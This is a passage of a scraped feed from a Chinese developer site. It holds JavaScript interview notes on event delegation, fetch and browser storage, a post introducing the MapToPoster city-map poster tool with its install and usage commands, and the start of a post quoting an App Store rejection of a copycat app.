<p>利用事件冒泡机制，将监听器绑定到父元素，统一处理子元素事件：</p>
<p>html</p>
<p>预览</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"parent-list"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>Item 1<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>Item 2<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
</code></pre>
<p>javascript</p>
<p>运行</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> parent = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'parent-list'</span>);
parent.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
  <span class="hljs-comment">// 精准匹配目标元素</span>
  <span class="hljs-keyword">if</span> (e.<span class="hljs-property">target</span>.<span class="hljs-property">nodeName</span> === <span class="hljs-string">'LI'</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`点击了：<span class="hljs-subst">${e.target.textContent}</span>`</span>);
  }
});
</code></pre>
<h2 data-id="heading-28">九、AJAX 与本地存储</h2>
<h3 data-id="heading-29">1. fetch API（主流异步请求方案）</h3>
<p>基于 Promise，需手动处理 HTTP 错误状态码：</p>
<p>javascript</p>
<p>运行</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchUserData</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'https://api.example.com/user/1'</span>);
    <span class="hljs-keyword">if</span> (!res.<span class="hljs-property">ok</span>) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`HTTP错误：<span class="hljs-subst">${res.status}</span>`</span>); <span class="hljs-comment">// 处理404/500等错误</span>
    <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> res.<span class="hljs-title function_">json</span>(); <span class="hljs-comment">// 解析JSON响应</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);
  } <span class="hljs-keyword">catch</span> (err) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'请求失败：'</span>, err);
  }
}
</code></pre>
<h3 data-id="heading-30">2. 本地存储方案对比（面试高频）</h3>





























<table><thead><tr><th>方案</th><th>生命周期</th><th>存储大小</th><th>与服务器通信</th></tr></thead><tbody><tr><td>localStorage</td><td>永久存储，手动清除</td><td>约 5MB</td><td>不携带，仅客户端使用</td></tr><tr><td>sessionStorage</td><td>标签页关闭后清除</td><td>约 5MB</td><td>不携带，仅客户端使用</td></tr><tr><td>Cookie</td><td>可设置过期时间（默认会话）</td><td>约 4KB</td><td>每次 HTTP 请求自动携带</td></tr></tbody></table></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[一张城市地图，也能做成高级感海报——城市地图海报生成器 MapToPoster]]></title>    <link>https://juejin.cn/post/7597025960946974755</link>    <guid>https://juejin.cn/post/7597025960946974755</guid>    <pubDate>2026-01-20T09:46:26.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597025960946974755" data-draft-id="7597199288817778728" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="一张城市地图，也能做成高级感海报——城市地图海报生成器 MapToPoster"/> <meta itemprop="keywords" content="开源,GitHub"/> <meta itemprop="datePublished" content="2026-01-20T09:46:26.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="趣丸技术"/> <meta itemprop="url" content="https://juejin.cn/user/342703357043576"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            一张城市地图，也能做成高级感海报——城市地图海报生成器 MapToPoster
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/342703357043576/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    趣丸技术
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T09:46:26.000Z" title="Tue Jan 20 2026 09:46:26 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>你有没有遇到过这样的场景👇</p>
<ul>
<li>
<p>想把<strong>生活过的城市</strong>做成一张纪念海报</p>
</li>
<li>
<p>想给<strong>公司乔迁、城市活动、展会</strong>设计一张地图背景</p>
</li>
<li>
<p>想把<strong>旅行路线、城市记忆</strong>做得有点设计感，而不是截图一张高德地图</p>
</li>
</ul>
<p>但现实是：</p>
<p>👉 PS 太重</p>
<p>👉 专业地图软件太复杂</p>
<p>👉 截图太丑，还带水印</p>
<p>直到我最近试用了一个工具——<strong>MapToPoster（城市地图海报生成器）</strong>。</p>
<h2 data-id="heading-0">简介</h2>
<h3 data-id="heading-1">MapToPoster 是什么？</h3>
<p>一句话概括：</p>
<blockquote>
<p><strong>为世界上的任何一座城市生成精美、简约的地图海报</strong></p>
</blockquote>
<p>开源项目地址: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Foriginalankur%2Fmaptoposter" target="_blank" title="https://github.com/originalankur/maptoposter" ref="nofollow noopener noreferrer">github.com/originalank…</a></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a8cf9ef85e6f485d80542906926d7ade~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Laj5Li45oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769507186&amp;x-signature=%2BZrqH7ctreBqa8cr3mPOAE7wkIE%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-2">快速开始</h2>
<h3 data-id="heading-3">Step 1：克隆项目代码</h3>
<p>首先，将 MapToPoster 项目克隆到本地</p>
<pre><code class="hljs language-bash" lang="bash">git <span class="hljs-built_in">clone</span> https://github.com/originalankur/maptoposter
</code></pre>
<h3 data-id="heading-4">Step 2：安装依赖</h3>
<p>确保你的环境中已经安装了 <strong>Python 3.8+</strong>，然后在项目根目录下执行：</p>
<pre><code class="hljs language-css" lang="css">pip install -r requirements<span class="hljs-selector-class">.txt</span>
</code></pre>
<p><code>这一步会自动安装项目所需的依赖库，无需手动逐个配置。</code></p>
<h3 data-id="heading-5">Step 3：使用(内部使用Nominatim需科学上网)</h3>
<p>安装完成后，通过一条命令即可生成城市地图海报：</p>
<pre><code class="hljs language-css" lang="css">python create_map_poster<span class="hljs-selector-class">.py</span> <span class="hljs-attr">--city</span>  <span class="hljs-attr">--country</span>  <span class="hljs-selector-attr">[options]</span>
</code></pre>
<p>参数说明：</p>



































<table><thead><tr><th>参数名</th><th>简写</th><th>说明</th><th>默认值</th></tr></thead><tbody><tr><td>--city</td><td>-c</td><td>城市名</td><td/></tr><tr><td>--country</td><td>-C</td><td>国家名</td><td/></tr><tr><td>--theme</td><td>-t</td><td>主题名</td><td>feature_based</td></tr><tr><td>--distance</td><td>-d</td><td>地图半径(单位: 米)</td><td>29000</td></tr></tbody></table>
<p>示例：</p>
<pre><code class="hljs language-apache" lang="apache">python create_map_poster.py -c "Beijing" -C "China" -t noir -d 12000
</code></pre>
<p><code>运行完成后，即可在输出目录中获得一张可直接打印或分享的高清城市地图海报</code></p>
<h2 data-id="heading-6">效果图</h2>
<p>城市: 中国-北京<br/>
命令: python create_map_poster.py -c "Beijing" -C "China" -t neon_cyberpunk -d 12000</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d49126f6ae4241079824ea1a42153c4c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Laj5Li45oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769507186&amp;x-signature=7CwLsxqtY4OOq1F7Ab3yLorOmF4%3D" alt="" loading="lazy"/></p>
<p>城市: 美国-纽约<br/>
命令: python create_map_poster.py -c "New York" -C "USA" -t terracotta -d 12000</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/02c8cc9937bc4ee7b893d877363bf6fa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Laj5Li45oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769507186&amp;x-signature=3%2BmVSDkzX5%2FGILDY%2FqsnSEaiOp8%3D" alt="" loading="lazy"/></p>
<p>城市: 澳大利亚-墨尔本<br/>
命令: python create_map_poster.py -c "Melbourne" -C "Australia" -t midnight_blue -d 12000</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/126e5ef6b3db41f9b335a3ba438101b7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Laj5Li45oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769507186&amp;x-signature=25Plmoo1XM8etsukU4SPvjGzmHE%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-7">结语</h2>
<p>地图，本身就是一种很有力量的视觉语言。<br/>
而 <strong>MapToPoster</strong> 做的事情，就是把这种力量，<br/>
<strong>交到普通人手里</strong>。</p>
<p>如果你也想：</p>
<ul>
<li>
<p>把一座城市，变成一张有意义的海报</p>
</li>
<li>
<p>或者给你的内容、设计、产品，加点“城市质感”</p>
</li>
</ul>
<p>这个工具，值得你试一试。</p>
<h4 data-id="heading-8">推荐阅读</h4>
<p>• <a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzU5Mzk1NTc5Ng%3D%3D%26mid%3D2247484211%26idx%3D1%26sn%3Dc32735c3ac8092f74075f40e337dc713%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzU5Mzk1NTc5Ng==&amp;mid=2247484211&amp;idx=1&amp;sn=c32735c3ac8092f74075f40e337dc713&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">熬夜整理的！黑客级Chrome插件让我效率开挂了</a><br/>
• <a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzU5Mzk1NTc5Ng%3D%3D%26mid%3D2247484362%26idx%3D1%26sn%3D4eabe6cfebe207124378c1a409024669%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzU5Mzk1NTc5Ng==&amp;mid=2247484362&amp;idx=1&amp;sn=4eabe6cfebe207124378c1a409024669&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">程序员哭了！这工具三行代码干掉爬虫，网友：再也不想写正则了…</a><br/>
• <a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzU5Mzk1NTc5Ng%3D%3D%26mid%3D2247484350%26idx%3D1%26sn%3D63a772412a9026c05e0123277750c995%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzU5Mzk1NTc5Ng==&amp;mid=2247484350&amp;idx=1&amp;sn=63a772412a9026c05e0123277750c995&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">不会 Git？Oh My Git让你边玩游戏边学会！</a><br/>
• <a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzU5Mzk1NTc5Ng%3D%3D%26mid%3D2247484197%26idx%3D1%26sn%3D0e9eb69e1fd113c9116ea4c4329fcb4f%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzU5Mzk1NTc5Ng==&amp;mid=2247484197&amp;idx=1&amp;sn=0e9eb69e1fd113c9116ea4c4329fcb4f&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">IDEA+Continue插件+DeepSeek:开发者效率飙升</a><br/>
• <a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzU5Mzk1NTc5Ng%3D%3D%26mid%3D2247484256%26idx%3D1%26sn%3D0c48da4a42135c320ba1d01452c69731%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzU5Mzk1NTc5Ng==&amp;mid=2247484256&amp;idx=1&amp;sn=0c48da4a42135c320ba1d01452c69731&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">一分钟制作出一条视频？DeepSeek+剪映=王炸</a><br/>
• <a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzU5Mzk1NTc5Ng%3D%3D%26mid%3D2247484186%26idx%3D1%26sn%3Da86c3b0b1cec6d491a760ae29126e8d5%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzU5Mzk1NTc5Ng==&amp;mid=2247484186&amp;idx=1&amp;sn=a86c3b0b1cec6d491a760ae29126e8d5&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">5分钟搞定Spring项目与DeepSeek集成</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[我帮你们试过了，AppStore“SI了么”已经无法上架！]]></title>    <link>https://juejin.cn/post/7597125475601580059</link>    <guid>https://juejin.cn/post/7597125475601580059</guid>    <pubDate>2026-01-20T10:16:46.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597125475601580059" data-draft-id="7597253913248235561" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="我帮你们试过了，AppStore“SI了么”已经无法上架！"/> <meta itemprop="keywords" content="APP,Apple,uni-app"/> <meta itemprop="datePublished" content="2026-01-20T10:16:46.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="iOS研究院"/> <meta itemprop="url" content="https://juejin.cn/user/1421041942671774"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            我帮你们试过了，AppStore“SI了么”已经无法上架！
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1421041942671774/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    iOS研究院
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T10:16:46.000Z" title="Tue Jan 20 2026 10:16:46 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">背景</h2>
<p>2026年开盘第一名黑马APP-死了么。虽然热度大不如前些时日，流量的红利可谓依旧在。</p>
<p>所以闲来无事，我也仿制一个赝品的<code>'死了么'</code>，没想到出师未捷身先死！</p>
<p><strong>苹果被拒原文</strong></p>
<pre><code class="hljs language-vbnet" lang="vbnet">Hello, 

Thank you <span class="hljs-keyword">for</span> submitting the <span class="hljs-built_in">new</span> app, x了么 - 官方新版告别死了么, <span class="hljs-keyword">for</span> review. We noticed some issues that require your attention. Please see below <span class="hljs-keyword">for</span> additional information.

<span class="hljs-keyword">If</span> you have any questions, we are here <span class="hljs-keyword">to</span> help. Reply <span class="hljs-keyword">to</span> this message <span class="hljs-keyword">in</span> App Store Connect <span class="hljs-built_in">and</span> <span class="hljs-keyword">let</span> us know.

Review Environment

Submission ID: c48b1695-<span class="hljs-number">9</span>cc0-<span class="hljs-number">45</span>a8-<span class="hljs-number">975</span>f-b6ac60ce455d
Review <span class="hljs-type">date</span>: January <span class="hljs-number">15</span>, <span class="hljs-number">2026</span>
Review Device: iPad Air <span class="hljs-number">11</span>-inch (M3)
Version reviewed: <span class="hljs-number">1.0</span>.<span class="hljs-number">0</span>


Guideline <span class="hljs-number">4.1</span> - Design - Copycats

The app<span class="hljs-comment">'s metadata contains third-party content similar to a popular app or game already available on the App Store, from a developer's website or distribution source, or from a third-party platform. This creates a misleading association with another developer's app or intellectual property. </span>

Specifically, the app<span class="hljs-comment">'s name includes references to 死了么.</span>

<span class="hljs-keyword">Next</span> Steps

It would be appropriate <span class="hljs-keyword">to</span> revise the app <span class="hljs-built_in">and</span> metadata <span class="hljs-keyword">to</span> remove this third-party content before resubmitting <span class="hljs-keyword">for</span> review. 

<span class="hljs-keyword">If</span> you have the necessary rights <span class="hljs-keyword">to</span> distribute an app <span class="hljs-keyword">with</span> this third-party content, attach documentary evidence <span class="hljs-keyword">in</span> the App Review Information section <span class="hljs-keyword">in</span> App Store Connect <span class="hljs-built_in">and</span> reply <span class="hljs-keyword">to</span> this message. 

Resources

Many factors may contribute <span class="hljs-keyword">to</span> a guideline <span class="hljs-number">4.1</span> rejection, including but <span class="hljs-built_in">not</span> limited <span class="hljs-keyword">to</span> the following examples:

- <span class="hljs-keyword">Using</span> the app metadata <span class="hljs-built_in">or</span> developer account information <span class="hljs-keyword">to</span> create a misleading association <span class="hljs-keyword">with</span> another app.
- Including irrelevant references <span class="hljs-keyword">to</span> popular apps <span class="hljs-keyword">in</span> an app<span class="hljs-comment">'s name or subtitle.</span>
- Copying the content, features, <span class="hljs-built_in">and</span> user <span class="hljs-keyword">interface</span> <span class="hljs-keyword">of</span> popular apps.

